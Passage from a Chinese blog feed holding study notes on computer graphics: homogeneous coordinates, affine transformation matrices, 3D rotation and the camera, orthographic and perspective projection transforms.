<p>如上图，我们想要将图片右移$t_x$上移$t_y$，可得有方程组<br>$$<br>\begin{cases} x’&#x3D;x+t_x\ y’&#x3D;y+t_y\end{cases}<br>$$<br>怎么样的矩阵变换可以得到呢？<br>$$<br>\begin{bmatrix}  x’\  y’\end{bmatrix} &#x3D; \begin{bmatrix}  a &amp; b \  c&amp;d\end{bmatrix} \begin{bmatrix}   x \  y\end{bmatrix}+ \begin{bmatrix}  t_x \  t_y\end{bmatrix}<br>$$<br>上述$a&#x3D;d&#x3D;1,b&#x3D;c&#x3D;0$。可以看到必须通过一个相加的操作才能得到正确的坐标变换表示，这破坏了我们的期望：结果用一个变换矩阵乘法得到。或者说，破坏了人们的懒惰性，但是啊人总是贪婪的，于是想着法子偷懒。还真就发明出来一个很有用很简洁的表示方法。就是齐次坐标。</p>
<h2 id="齐次坐标（Homogeneous-coordinates）"><a href="#齐次坐标（Homogeneous-coordinates）" class="headerlink" title="齐次坐标（Homogeneous coordinates）"></a>齐次坐标（Homogeneous coordinates）</h2><p>齐次坐标就是将一个原本是$n$维的向量用一个$n+1$维向量来表示，是指一个用于投影几何里的坐标系统，如同用于欧氏几何里的笛卡儿坐标一般。关于它的重要性：</p>
<blockquote>
<p>《计算机图形学(OpenGL版)》的作者F.S. Hill Jr.曾说过一句话：</p>
<p>“齐次坐标表示是计算机图形学的重要手段之一，它既能够用来明确区分向量和点，同时也更易用于进行仿射（线性）几何变换。”</p>
<p>于是我们知道，其重要性，主要有二，其一是区分向量和点，其二是易于进行仿射变化(Affine Transformation) 。</p>
</blockquote>
<p>具体怎么应用呢？可以浅显的理解为：对于点来说，扩展为$(x,y,1)^T$。对向量来说，扩展为$(x,y,0)^T$</p>
<p>对于平移来说，就可以这样表示：<br>$$<br>\begin{bmatrix}  x’\  y’\ 1 \end{bmatrix} &#x3D; \begin{bmatrix}  1  &amp; 0 &amp;t_x \  0&amp;1&amp;t_y\ 0&amp;0&amp;1\end{bmatrix}\begin{bmatrix}   x \  y\ 1\end{bmatrix}&#x3D; \begin{bmatrix}  x+t_x \  y+t_y\ 1 \end{bmatrix}<br>$$<br>这样就成功的表示为了乘积的形式，而增加的维度并不会对程序效率等造成很大影响，是一个很棒的解决方案。此时变换矩阵和齐次坐标分别为：<br>$$<br>\begin{bmatrix}  1  &amp; 0 &amp;t_x \  0&amp;1&amp;t_y\ 0&amp;0&amp;1 \end{bmatrix}    \quad\quad\quad\quad\quad<br>\begin{bmatrix}   x \  y\ 1\end{bmatrix}<br>$$<br>上述，如果点被拓展为扩展为$(x,y,w)^T$，那么$x$、$y$就要变为$\frac{x}{w}$、$\frac{y}{w}$来表示。</p>
<p>这是针对每个点的平移来说的，那么为什么向量要拓展为$(x,y,0)^T$，最后是一个零呢？<br>$$<br>\begin{bmatrix}  x’\  y’\ 0   \end{bmatrix} &#x3D; \begin{bmatrix}  1  &amp; 0 &amp;t_x \  0&amp;1&amp;t_y\ 0&amp;0&amp;1  \end{bmatrix} \begin{bmatrix}   x \  y\ 0  \end{bmatrix}&#x3D; \begin{bmatrix}  x \  y\ 0  \end{bmatrix}<br>$$<br>套用上面的公式，我们得到了上述结果。我们知道向量只跟两个要素有关，长度和方向，所以移动的$t_x$，$t_y$不应对此产生影响，故拓展为$(x,y,0)^T$，刚好解决了此问题。</p>
<h2 id="仿射变换（Affine-Transformation）"><a href="#仿射变换（Affine-Transformation）" class="headerlink" title="仿射变换（Affine Transformation）"></a>仿射变换（Affine Transformation）</h2><p>再看上面那个名人名言中的：齐次坐标有利于进行仿射变换。那么仿射变换又是什么呢？</p>
<p>个人理解仿射变换其实是就是上述两种简单变换的叠加：一个是线性变换，一个是平移变换</p>
<p>仿射变换变化包括缩放、旋转、反射、错切以及平移，原来的直线仿射变换后还是直线，原来的平行线经过仿射变换之后还是平行线，这就是仿射。就是我们上述介绍的变换的组合。当然也就是我们介绍齐次坐标所用到的矩阵变化。</p>
<p>一个集合的仿射变换为：<br>$$<br>f(x)&#x3D;Ax+b,x\in X<br>$$<br>仿射变换是二维平面中一种重要的变换，在图像图形领域有广泛的应用，在二维图像变换中，一般表达为：<br>$$<br>\begin{bmatrix}  x’\  y’\ 1   \end{bmatrix} &#x3D; \begin{bmatrix}  R_0  &amp; R_1 &amp;t_x \  R_2&amp;R_3&amp;t_y\ 0&amp;0&amp;1  \end{bmatrix} \begin{bmatrix}   x \  y\ 1  \end{bmatrix}<br>$$<br>针对二维，它的变化是有规律的。比如最后一行是固定的$(0,0,1)$，而第一、二行前两列是要进行的线性变换，而最后一列是要平移的距离$t_x$，$t_y$。</p>
<h3 id="平移变换矩阵"><a href="#平移变换矩阵" class="headerlink" title="平移变换矩阵"></a>平移变换矩阵</h3><p>据此可以得出引入齐次坐标后仿射变化的变换矩阵了，对于平移：<br>$$<br>M&#x3D;\begin{bmatrix}  1  &amp; 0 &amp;t_x \  0&amp;1&amp;t_y\ 0&amp;0&amp;1  \end{bmatrix}<br>$$</p>
<h3 id="缩放、切变、反射、旋转变换矩阵"><a href="#缩放、切变、反射、旋转变换矩阵" class="headerlink" title="缩放、切变、反射、旋转变换矩阵"></a>缩放、切变、反射、旋转变换矩阵</h3><p>同理，对于线性变换的四种，由于没有平移量，故$t_x$，$t_y$都为0，所以它们的变换矩阵：<br>$$<br>M&#x3D;\begin{bmatrix}  A  &amp; B &amp;0 \  C&amp;D&amp;0\ 0&amp;0&amp;1  \end{bmatrix}<br>$$<br>具体A、B、C、D的内容参照上面的线性变化。</p>
<h2 id="变换的组合与分解（Combination-and-decomposition-of-transformations）"><a href="#变换的组合与分解（Combination-and-decomposition-of-transformations）" class="headerlink" title="变换的组合与分解（Combination and decomposition of transformations）"></a>变换的组合与分解（Combination and decomposition of transformations）</h2><h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>变换的组合其实就是上述线性与平移变换的叠加变换。需要注意的是变换的顺序：<strong>先线性后平移</strong>。</p>
<p>看下面一个例子，如果进行图示的变换呢？</p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615211040558.png" alt="image-20220615211040558 " style="zoom:67%;" loading="lazy">

<p>第一种方案是先平移后旋转，显然是不行的。</p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615211106611.png" alt="image-20220615211106611 " style="zoom:67%;" loading="lazy">

<p>先旋转后平移是可以的。</p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615211128228.png" alt="image-20220615211128228 " style="zoom:67%;" loading="lazy">

<p>为什么一定要保持这个顺序呢？因为<strong>矩阵乘法没有交换律</strong>！</p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615211213329.png" alt="image-20220615211213329 " style="zoom:67%;" loading="lazy">

<p>而针对数学表达来说，我个人形象的理解为遵循就近原则，向量先与最接近的变换矩阵相乘。</p>
<p><img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615211227473.png" alt="image-20220615211227473" loading="lazy"></p>
<h3 id="分解"><a href="#分解" class="headerlink" title="分解"></a>分解</h3><p>分解其实就是组合的逆过程，一种简单的方法是：先将左下点移动到原点之后再进行线性与平移操作。</p>
<p><img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615211630296.png" alt="image-20220615211630296" loading="lazy"></p>
<h1 id="3D变换"><a href="#3D变换" class="headerlink" title="3D变换"></a>3D变换</h1><p>3D变换跟上述的2D变化大多拥有相同的规律，无论是考不考虑齐次坐标，也就相当于多增加了一个维度。</p>
<p>仿射变换在三维当中的应用表达式为：<br>$$<br>\begin{bmatrix}  x’\  y’\ z’ \1  \end{bmatrix} &#x3D; \begin{bmatrix}  R_0  &amp; R_1 &amp; R_2&amp;t_x \  R_3&amp;R_4&amp;R_5&amp;t_y\ R_6&amp;R_7&amp;R_8&amp;t_z\ 0&amp;0&amp;0&amp;1  \end{bmatrix} \begin{bmatrix}   x \  y\z \1  \end{bmatrix}<br>$$<br>同样地，如果点被拓展为扩展为$(x,y,z,w)^T$，那么$x$、$y$、$z$就要变为$\frac{x}{w}$、$\frac{y}{w}$、$\frac{z}{w}$来表示。</p>
<h2 id="平移变换矩阵-1"><a href="#平移变换矩阵-1" class="headerlink" title="平移变换矩阵"></a>平移变换矩阵</h2><p>3D变换的平移用齐次坐标表示的变换矩阵为：<br>$$<br>translation(t_x,t_y,t_z)&#x3D;\begin{bmatrix}  1  &amp; 0 &amp;0&amp;t_x \   0  &amp; 1 &amp;0&amp;t_y\  0  &amp; 0 &amp;1&amp;t_z \ 0  &amp; 0 &amp;0&amp;1  \end{bmatrix}<br>$$</p>
<h2 id="缩放变换矩阵"><a href="#缩放变换矩阵" class="headerlink" title="缩放变换矩阵"></a>缩放变换矩阵</h2><p>3D变换的缩放用齐次坐标表示的变换矩阵为：<br>$$<br>scale(s_x,s_y,s_z)&#x3D;\begin{bmatrix} s_x  &amp; 0 &amp;0&amp;0 \   0  &amp; s_y &amp;0&amp;0\  0  &amp; 0 &amp;s_z&amp;0 \ 0  &amp; 0 &amp;0&amp;1  \end{bmatrix}<br>$$<br>还有切变与反射这边就不展开了，都是类似的</p>
<h2 id="旋转变换矩阵"><a href="#旋转变换矩阵" class="headerlink" title="旋转变换矩阵"></a>旋转变换矩阵</h2><h3 id="绕坐标轴旋转"><a href="#绕坐标轴旋转" class="headerlink" title="绕坐标轴旋转"></a>绕坐标轴旋转</h3><p>3D当中的旋转可以说是最难的一种物体变换，和2D有很大的不同。首先考虑最简单的绕三个轴旋转，变换矩阵依次为：<br>$$<br>R_x(\alpha)&#x3D;\begin{bmatrix}  1  &amp; 0 &amp;0&amp;0 \   0  &amp; cos\alpha &amp;-sin\alpha&amp;0\  0  &amp; sin\alpha &amp;cos\alpha&amp;0 \ 0  &amp; 0 &amp;0&amp;1  \end{bmatrix} \quad\quad<br>R_y(\alpha)&#x3D;\begin{bmatrix}  cos\alpha  &amp; 0 &amp;sin\alpha&amp;0 \   0  &amp; 1 &amp;0&amp;0\  -sin\alpha  &amp; 0 &amp;cos\alpha&amp;0 \ 0  &amp; 0 &amp;0&amp;1  \end{bmatrix} \quad\quad<br>R_z(\alpha)&#x3D;\begin{bmatrix}  cos\alpha  &amp; -sin\alpha &amp;0&amp;0 \  sin\alpha  &amp; cos\alpha &amp;0&amp;0\  0  &amp; 0 &amp;1&amp;0 \ 0  &amp; 0 &amp;0&amp;1  \end{bmatrix}<br>$$<br>我们所采用的是右手系，因此旋转是有定向的。正如在二维，是$x$轴向$y$轴旋转。类似地，运用右手螺旋定则，对应到3维便是绕$z$轴旋转($x$轴转向$y$轴)，不难推出绕$x$轴旋转($y$转向$z$)，绕$y$轴旋转($z$转向$x$)，就是这么一个规律$$ x-&gt;y-&gt;z-&gt;x…$$这样就可以将问题简化为固定一边不变，而另外两个维度就是2D变换的变换矩阵。</p>
<p>因此理解了上面这个来看绕$x$(绕$x$轴，故$x$不变，且$y$转向$z$)和$z$(绕$z$轴，故$z$不变，且$x$转向$y$)旋转的变换矩阵。那绕$y$轴为啥会有所不同呢？主要原因是我们是固定$y$轴，然后由且$z$转向$x$，而不是$x$转向$z$，故有所不同。</p>
<p>同上述2D，3D变换中的旋转矩阵也都是正交矩阵</p>
<h3 id="绕任意轴旋转"><a href="#绕任意轴旋转" class="headerlink" title="绕任意轴旋转"></a>绕任意轴旋转</h3><p>之前2D中变换的分解我们可以了解到这么一个思想：先把物体平移到原点，再进行线性变化，之后将物体平移回去。在3D旋转中我们同样可以借鉴这个思想，我们可以先将物体整个平移到相较于它的坐标轴零点，然后进行相应的旋转，之后再把物体平移回去即可。</p>
]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>变换矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机图形学二：视图变换-Viewing Tranformation</title>
    <url>/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由之前的变换矩阵我们可以了解到，通过将之与向量或点的相乘就可以使之发生仿射变换。那么在实际中它可以干啥或者说是有什么应用呢？这就与今天学习的视图变换产生了关联。</p>
<p>新的问题：为什么要有视图变换？虎书中是这么说的：视图变换的目的就是将三维空间中以$(x,y,z)$表示的物体转换到二维坐标系中，以像素（pixels）为基本单位表示。而这个视图变换过程又包含很多复杂的操作，比如相机的位置和方向、投影的类型、视野大小，以及图像的处理等。</p>
<span id="more"></span>

<p>虎书上将其整个过程分成了四步：</p>
<ul>
<li>模型变换：将游戏场景中的物体调整至它们应有的状态或位置</li>
<li>摄像机变换：摄像机可以看到整个游戏的场景和布局，这个我之前用unity做过游戏有一定的了解。所有的场景和游戏物体都是通过摄像机的捕捉来呈现的，需要得到物体与摄像机的相对位置来实现摄像机变换</li>
<li>投影变换：根据摄像机变换得到了所有可视范围内的物体对于摄像机的相对位置坐标$(x,y,z)$之后，选择正交投影或者透视投影，将三维空间投影至标准二维平面$([-1,1]^2)$之上</li>
<li>视口变换：经过投影变换物体的形状大小将会变化，需要通过视图变换将物体”还原“成原来的小大，即将处于标准平面映射到屏幕分辨率范围之内，$[-1,1]^2→ [0,width]*[0,height]$，其中$width$和$height$指屏幕分辨率大小</li>
</ul>
<p>流程示意图：</p>
<img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/image-20220616154305794.png" alt="image-20220616154305794 " style="zoom:67%;" loading="lazy">

<h1 id="模型变换（Modeling-Transformation）"><a href="#模型变换（Modeling-Transformation）" class="headerlink" title="模型变换（Modeling Transformation）"></a>模型变换（Modeling Transformation）</h1><p>模型变换比较简单，就是利用变换矩阵通过仿射变换（平移、旋转、缩放等）使得物体的状态和位置发生改变，让它出现在应该出现的位置并呈现应有的形态</p>
<h1 id="摄像机-x2F-视图变换（Camera-x2F-View-Transformation）"><a href="#摄像机-x2F-视图变换（Camera-x2F-View-Transformation）" class="headerlink" title="摄像机&#x2F;视图变换（Camera&#x2F;View Transformation）"></a>摄像机&#x2F;视图变换（Camera&#x2F;View Transformation）</h1><p>我想在了解摄像机变换之前，我们首先得知道如何定义一个摄像机：</p>
<img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/image-20220616154825800.png" alt="image-20220616154825800 " style="zoom:40%;" loading="lazy">

<p>这边定义了三个向量：</p>
<ul>
<li>摄像机位置 (camera postion)           $\overline{e}$</li>
<li>观察方向 (gaze postion)                    $\hat{g}$</li>
<li>视点正上方向 (view-up vector)         $\hat{t}$</li>
</ul>
<p>搞清摄像机变换的诉求：得到摄像机与物体之间的相对位置。如何做呢？我们把物体和摄像机一起做相对移动，如果能够把摄像机的坐标移动到标准的$xyz$轴的$(0,0,0)$点，那么此时物体的坐标不自然是相对坐标了吗！并且为了接下来的物体投影到$xy$平面方便，在右手系中，我们假定<strong>摄像机的观察方向 $\hat{g}$是朝着$-Z$的，视点正上方向 $\hat{t}$是朝着$Y$的</strong>。</p>
<p><img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/image-20220616155611408.png" alt="image-20220616155611408" loading="lazy"></p>
<p>基本思路有了，现在想想怎么用变换矩阵来实现呢？明确一下问题，我们要做的其实就是两件事：<strong>将相机位置移动至原点以及通过旋转矩阵将二者坐标系重合</strong>。用一个例子来说明，我们需要实现从左图到右图的转变。</p>
<center class="half">    <img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/github_blog\source\_posts\计算机图形学二：视图变换-Viewing-Transformation\image-20220616160121700.png" width="300" loading="lazy">          <img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/github_blog\source\_posts\计算机图形学二：视图变换-Viewing-Transformation\B8$M~<img91E5}$TOVB$MZSR3.png" width="300" loading="lazy"> </center>

<p>不难看出，具体做法是：</p>
<ol>
<li>将摄像机位置平移到原点</li>
<li>将摄像机的观察方向 $\hat{g}$是旋转朝至$-Z$</li>
<li>将视点正上方向 $\hat{t}$旋转朝至$Y$</li>
<li>旋转$\hat{g}*\hat{t}$朝至$X$</li>
</ol>
<p>平移、旋转，这时候就是变换矩阵大显身手的时候了。首先是平移，十分简单可得变换矩阵：<br>$$<br>T_{view} &#x3D; \begin{bmatrix} 1 &amp;0&amp;0&amp;-x_e \0&amp;1&amp;0&amp;-y_e  \0&amp;0&amp;1&amp;-z_e \0&amp;0&amp;0&amp;1\end{bmatrix}<br>$$<br>然后就是三者的旋转了，会发现尝试将这三个方向旋转至标准坐标系是十分困难的，不妨反过来，考虑将标准坐标系转换为这三者，之后再利用逆操作变化一下即可。可以得到旋转的逆变换矩阵：<br>$$<br>R^{-1}<em>{view} &#x3D; \begin{bmatrix} x</em>{\hat{g}*\hat{t}} &amp;x_t&amp;x_{-g}&amp;0 \y_{\hat{g}*\hat{t}}&amp;y_t&amp;y_{-g}&amp;0  \z_{\hat{g}*\hat{t}}&amp;z_t&amp;z_{-g}&amp;0 \0&amp;0&amp;0&amp;1\end{bmatrix}<br>$$<br>正着推一下就可以知道其正确性了，以$x$轴为例，其方向向量为$(1,0,0,0)^T$，与上述举证相乘：<br>$$<br>\begin{bmatrix} x_{\hat{g}*\hat{t}} &amp;x_t&amp;x_{-g}&amp;0 \y_{\hat{g}*\hat{t}}&amp;y_t&amp;y_{-g}&amp;0  \z_{\hat{g}*\hat{t}}&amp;z_t&amp;z_{-g}&amp;0 \0&amp;0&amp;0&amp;1\end{bmatrix} \begin{bmatrix} 1\0\0\0\end{bmatrix}&#x3D;\begin{bmatrix} x_{\hat{g}*\hat{t}}\y_{\hat{g}*\hat{t}}\z_{\hat{g}*\hat{t}}\0\end{bmatrix}<br>$$<br>这就实现了旋转$\hat{g}*\hat{t}$朝至$X$，其余两条乘相应坐标轴方向向量也可得到正确结果。</p>
<p>新的问题来了，这是逆变换矩阵啊，怎么样得到其变换矩阵呢？还记得前面旋转变换矩阵一个很重要的性质吗：<strong>旋转矩阵都是正交矩阵，即其逆矩阵等于转置矩阵</strong>。故可知，摄像机变换的旋转变换矩阵为：<br>$$<br>R_{view} &#x3D; \begin{bmatrix} x_{\hat{g}*\hat{t}} &amp;y_{\hat{g}*\hat{t}}&amp;z_{\hat{g}*\hat{t}}&amp;0 \x_t&amp;y_t&amp;z_t&amp;0  \x_{-g}&amp;y_{-g}&amp;z_{-g}&amp;0 \0&amp;0&amp;0&amp;1\end{bmatrix}<br>$$<br>综上，我们得到了摄像机变换的变换矩阵：<br>$$<br>M_{view}&#x3D;R_{view}T_{view}<br>$$</p>
<h1 id="投影变换（Projection-Transformation）"><a href="#投影变换（Projection-Transformation）" class="headerlink" title="投影变换（Projection Transformation）"></a>投影变换（Projection Transformation）</h1><p>3D物体投影到2D平面需要经过投影变换，因此它是十分重要的。包含两个变换：正交投影和透视投影。</p>
<img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/image-20220616165835374.png" alt="image-20220616165835374 " style="zoom:67%;" loading="lazy">

<h2 id="正交投影变换（Orthographic-Projection-Transformation）"><a href="#正交投影变换（Orthographic-Projection-Transformation）" class="headerlink" title="正交投影变换（Orthographic Projection Transformation）"></a>正交投影变换（Orthographic Projection Transformation）</h2><p>正交投影是相对简单的一种，坐标的相对位置都不会改变，所有光线都是平行传播，我们只需将物体全部转换到一个$[ − 1 , 1 ]^3 $的空间中即可。这边值得注意的是为什么要限定范围为$[ − 1 , 1 ]^3 $的空间中呢？我觉得一个博主的理解写的十分好</p>
<blockquote>
<p><strong>为什么要压缩到一个小立方体呢？其实这只是为了之后的计算更加的方便而已，在转换到屏幕坐标的时候就会重新拉伸回来，不必太做纠结，只需抓住正交投影的变化核心是，所有物体的相对大小位置都不会有任何变化。</strong></p>
</blockquote>
<p>这是书上的图形化描述：</p>
<img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/image-20220616170331696.png" alt="image-20220616170331696 " style="zoom:67%;" loading="lazy">

<p>用一个例子说明：假设摄像机在零点，摄像机的观察方向 $\hat{g}$是朝着$-Z$的，视点正上方向 $\hat{t}$是朝着$Y$的，如何得到此物体的正交投影呢？</p>
<img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/image-20220616170408977.png" alt="image-20220616170408977 " style="zoom:67%;" loading="lazy">

<p>很明显我们只需要通过将立方体的中心平移到原点和之后缩放立方体至标准$[ − 1 , 1 ]^3 $空间即可，图示为：</p>
<center class="half">    <img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/github_blog\source\_posts\计算机图形学二：视图变换-Viewing-Transformation\image-20220616170641128.png" width="300" loading="lazy">          <img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/github_blog\source\_posts\计算机图形学二：视图变换-Viewing-Transformation\image-20220616170649348.png" width="300" loading="lazy"> </center>

<p>得到其正交投影变换矩阵为：<br>$$<br>M_{orth} &#x3D; \begin{bmatrix} \frac{2}{r-l} &amp;0&amp;0&amp;0 \0 &amp;\frac{2}{t-b}&amp;0&amp;0 \0&amp;0&amp;\frac{2}{n-f}&amp;0 \0&amp;0&amp;0&amp;1\end{bmatrix}  \begin{bmatrix} 1 &amp;0&amp;0&amp; -\frac{r+l}{2} \0 &amp;1&amp;0&amp;-\frac{t+b}{2} \0&amp;0&amp;1&amp;-\frac{n+f}{2} \0&amp;0&amp;0&amp;1\end{bmatrix}&#x3D;\begin{bmatrix} \frac{2}{r-l} &amp;0&amp;0&amp; -\frac{r+l}{r-l} \0 &amp;\frac{2}{t-b}&amp;0&amp; -\frac{t+b}{t-b} \0&amp;0&amp;\frac{2}{n-f}&amp; -\frac{n+f}{n-f} \0&amp;0&amp;0&amp;1\end{bmatrix}<br>$$<br>解释一下，先平移，故右边是平移矩阵，将立方体中心移动至原点。左边是缩放矩阵，由于已经进行过平移，各面的坐标占一半，可以得到线性数据关系，将立方体塞到$[ − 1 , 1 ]^3 $空间。</p>
<h2 id="透视投影变换（Perspective-Projection-Transformation）"><a href="#透视投影变换（Perspective-Projection-Transformation）" class="headerlink" title="透视投影变换（Perspective Projection Transformation）"></a>透视投影变换（Perspective Projection Transformation）</h2><p>平行的东西变得不平行。</p>
<p>这是透视投影变换给我带来的最直观感受。事实上，它正是与人类的正常感官相符合的一种投影变换。所以应用比较多。</p>
<img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/image-20220616172839530.png" alt="image-20220616172839530 " style="zoom:67%;" loading="lazy">

<p>很经典的一幅图，火车铁轨必然是平行的，但是人眼观察发现铁轨是不平行的，甚至在远处能看到交点。我们可以发现，所有的透视投影都遵循<strong>近大远小</strong>的规律，一叶障目正是来源于此。</p>
<p>回到正题，如何得到透视投影变换矩阵呢？</p>
<img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/20200404195126530.png" alt="img " style="zoom:50%;" loading="lazy">

<p>上面两幅图，左边是透视投影，右边是正交投影。二者有什么关联或者说如何透视投影如何由正交投影得到呢？我们可以这样想象：将Frustum的后半部分进行压缩至与前面最终的投影界面大小相同，这样就成了一个立方体，之后进行一次假设的正交投影得到每条线应该投影到的位置，最后在进行一次真正的正交投影得到最终的透视投影。</p>
<p>上述猜想基于两个性质：</p>
<ul>
<li>后半部分的面进行压缩时，$z$变量是不动的，即不会向前或向后伸缩</li>
<li>后半部分的中心点不变</li>
</ul>
<p>更形象的，用侧面图表示：</p>
<p>将一点$( x , y , z )$投影至投影屏幕之后，坐标变为$( x’ , y’ , z’ )$，点原始距离摄影机为$z$，投影后距离摄影机$n$</p>
<img src="/2022/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%8C%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%8F%98%E6%8D%A2-Viewing-Transformation/20200404195216672.png" alt="img " style="zoom:50%;" loading="lazy">

<p>我们此时只考虑$y$的变换。由相似三角形可以得到$y’&#x3D;\frac{n}{z}y$。类似地，我们可以得到$x’&#x3D;\frac{n}{z}x$</p>
<p>根据齐次坐标的性质，我们可以知道$(1,0,0,1)^T$与$(k,0,0,k)^T$表示同一个点，所以我们可以得到：<br>$$<br>\begin{bmatrix} x\y\z\1\end{bmatrix}\Rightarrow\begin{bmatrix} \frac{nx}{z}\\frac{ny}{z}\unknown\1\end{bmatrix} &#x3D;&#x3D;\begin{bmatrix} nx\ny\unknown\z\end{bmatrix}<br>$$<br>即：<br>$$<br>M^{(4*4)}<em>{per\rightarrow orth}\begin{bmatrix} x\y\z\1\end{bmatrix}&#x3D;\begin{bmatrix} nx\ny\unknown\z\end{bmatrix}<br>$$<br>所以得到的透射到正交的变换矩阵是什么呢？<br>$$<br>M</em>{per\rightarrow orth}&#x3D;\begin{bmatrix} n &amp;0&amp;0&amp; 0 \0 &amp;n&amp;0&amp; 0\?&amp;?&amp;?&amp;?\0&amp;0&amp;1&amp;0\end{bmatrix}<br>$$<br>现在所要做的工作就是求出第三行。这里要用到透视投影的两个性质：</p>
<ul>
<li>被投影面（近面），即上图$z&#x3D;n$的那个面的点投影后位置不变</li>
<li>投影面（远面），即上图$z&#x3D;f$的那个面的点投影后$z$位置不变</li>
</ul>
